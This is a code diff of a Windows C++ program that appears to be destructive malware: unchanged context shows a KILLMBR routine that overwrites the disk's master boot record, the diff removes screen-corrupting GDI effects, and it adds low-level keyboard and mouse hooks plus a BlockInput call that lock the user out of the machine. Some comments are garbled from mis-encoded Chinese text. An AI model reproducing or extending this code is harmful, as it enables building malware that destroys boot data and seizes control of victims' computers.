@@ -1,15 +1,13 @@
 #include <tchar.h>
 #include <windows.h>
-#include <cstdlib>
-#include <ctime>
-#include <vector>
+#include <stdlib.h>
+#include <time.h>
+#include <Vector.h>
 #include <cstdio>
 #include <string>
 #include <pthread.h>
 #include <iostream> 
 
-#define COLOR 3
-#define COUNT 7
 #define random(a,b) (rand()%(b-a)+a) 
 
 const unsigned char code1[] = {
@@ -397,124 +395,67 @@ void KILLMBR(){
 	CloseHandle(drive);
 
 }
-int payloadPIP() {
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT rekt;
-	GetWindowRect(hwnd, &rekt);
-	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
-	ReleaseDC(hwnd, hdc);
-}
-void inftunnel(){
-	int time;
-	time = 200;
-	for(;;){
-		payloadPIP();
-		Sleep(time);
-		time -= time / 200 ;
-	}
-}
 
-// ∫Ï, ≥», ª∆, ¬Ã, «‡, ¿∂, ◊œ
-COLORREF dwColor[COUNT][COLOR] = { {255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {0, 255, 0}, {0, 255, 255}, {0, 0, 255}, {128, 0, 128} };
+HHOOK hook_hwnd_keyboard = NULL;
+HHOOK hook_hwnd_mouse = NULL;
+HMODULE g_module;
 
-// ÀÊª˙ ˝∫Ø ˝
-HCRYPTPROV hProv;
-int RandomColor()
+// Mouse Event
+LRESULT CALLBACK MyHookFunMouse(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	if (hProv == 0)
-		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
-			return 0;
-
-	int out = 0;
-	CryptGenRandom(hProv, sizeof(out), (BYTE*)(&out));
-
-	return out & 0x7FFFFFFF;
+	// Èº†Ê†áÊâÄÊúâ‰∫ã‰ª∂ÈÉΩ‰∏çÂ§ÑÁêÜ
+	return 1;
 }
 
-DWORD WINAPI Cubes_x(LPVOID lpParameter)
+// Keyboard Event
+LRESULT CALLBACK MyHookFunKeyBoard(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	int width = GetSystemMetrics(SM_CXSCREEN);
-	int height = GetSystemMetrics(SM_CYSCREEN);
-	int times = 0, delay = 0, n = RandomColor() % COUNT, y = RandomColor() % (height / 10) + (height / 200);
+	PKBDLLHOOKSTRUCT pVirKey = (PKBDLLHOOKSTRUCT)lParam;
 
-	BOOLEAN bVector = RandomColor() % 2 ? TRUE : FALSE;
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetDC(hwnd);
-	HDC hdcCopy = CreateCompatibleDC(hdc);
-	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, y);
-	HGDIOBJ hGdiobj = SelectObject(hdcCopy, hBitmap);
-
-	while ((times = (RandomColor() % (width / 2))) < 320) {}
-	while ((delay = (RandomColor() % 10000)) < 7000) {}
-	delay = delay / times;
-	SetPixel(hdcCopy, 0, 0, RGB(dwColor[n][0], dwColor[n][1], dwColor[n][2]));
-	StretchBlt(hdcCopy, 0, 0, width, y, hdcCopy, 0, 0, 1, 1, SRCCOPY);
-
-	for (int i = 0, ix = RandomColor() % width, iy = RandomColor() % height; i < times; i++)
+	if (nCode >= 0)
 	{
-		if (bVector)
-			BitBlt(hdc, ix + i, iy, 1, y, hdcCopy, 0, 0, SRCCOPY);
-		else
-			BitBlt(hdc, ix - i, iy, 1, y, hdcCopy, 0, 0, SRCCOPY);
-		Sleep(delay);
+		// Key Message
+		switch (wParam)
+		{
+		case WM_KEYDOWN:
+		case WM_SYSKEYDOWN:
+		case WM_KEYUP:
+		case WM_SYSKEYUP:
+			switch (pVirKey->vkCode)
+			{
+			case VK_LWIN:
+			case VK_RWIN:
+				return 1;
+				break;
+			}
+			return 1;
+			break;
+		}
 	}
-	SelectObject(hdcCopy, hGdiobj);
-	DeleteObject(hBitmap);
-	DeleteDC(hdcCopy);
-	ReleaseDC(hwnd, hdc);
 
-	return 0;
+	return CallNextHookEx(hook_hwnd_keyboard, nCode, wParam, lParam);
 }
 
-DWORD WINAPI Cubes_y(LPVOID lpParameter)
-{
-	int width = GetSystemMetrics(SM_CXSCREEN);
-	int height = GetSystemMetrics(SM_CYSCREEN);
-	int times = 0, delay = 0, n = RandomColor() % COUNT, x = RandomColor() % (width / 10) + (width / 200);
-
-	BOOLEAN bVector = RandomColor() % 2 ? TRUE : FALSE;
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetDC(hwnd);
-	HDC hdcCopy = CreateCompatibleDC(hdc);
-	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, x, height);
-	HGDIOBJ hGdiobj = SelectObject(hdcCopy, hBitmap);
-
-	while ((times = (RandomColor() % (height / 2))) < 240) {}
-	while ((delay = (RandomColor() % 10000)) < 7000) {}
-	delay = delay / times;
-	SetPixel(hdcCopy, 0, 0, RGB(dwColor[n][0], dwColor[n][1], dwColor[n][2]));
-	StretchBlt(hdcCopy, 0, 0, x, height, hdcCopy, 0, 0, 1, 1, SRCCOPY);
-
-	for (int i = 0, ix = RandomColor() % width, iy = RandomColor() % height; i < times; i++)
-	{
-		if (bVector)
-			BitBlt(hdc, ix, iy + i, x, 1, hdcCopy, 0, 0, SRCCOPY);
-		else
-			BitBlt(hdc, ix, iy - i, x, 1, hdcCopy, 0, 0, SRCCOPY);
-		Sleep(delay);
-	}
-	SelectObject(hdcCopy, hGdiobj);
-	DeleteObject(hBitmap);
-	DeleteDC(hdcCopy);
-	ReleaseDC(hwnd, hdc);
-
-	return 0;
+void LockKeyboard(){
+	hook_hwnd_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, MyHookFunKeyBoard, g_module, 0);
+}
+void LockMouse(){
+	hook_hwnd_mouse = SetWindowsHookEx(WH_MOUSE_LL, MyHookFunMouse, g_module, 0);
+}
+void UnLockKeyBoard(){
+	UnhookWindowsHookEx(hook_hwnd_keyboard);
+}
+void UnLockMouse(){
+	UnhookWindowsHookEx(hook_hwnd_mouse);
 }
 
-int randomDraw()
-{
-	HANDLE hThread;
-
-	for (;;)
-	{
-		if (RandomColor() % 2)
-			hThread = CreateThread(NULL, 0, Cubes_x, NULL, 0, NULL);
-		else
-			hThread = CreateThread(NULL, 0, Cubes_y, NULL, 0, NULL);
-
-		Sleep(random(50,200));
-	}
-	CloseHandle(hThread);
-
+int AllLock(bool lockb=false){
+	HINSTANCE hIn = NULL;
+	hIn = LoadLibrary("user32.dll");
+	if(hIn){
+        BOOL (_stdcall *BlockInput)(BOOL bFlag);
+        BlockInput = (BOOL (_stdcall *)(BOOL bFlag)) GetProcAddress(hIn, "BlockInput");
+        if (BlockInput) return BlockInput(lockb);
+    }
+	return -1;
 }
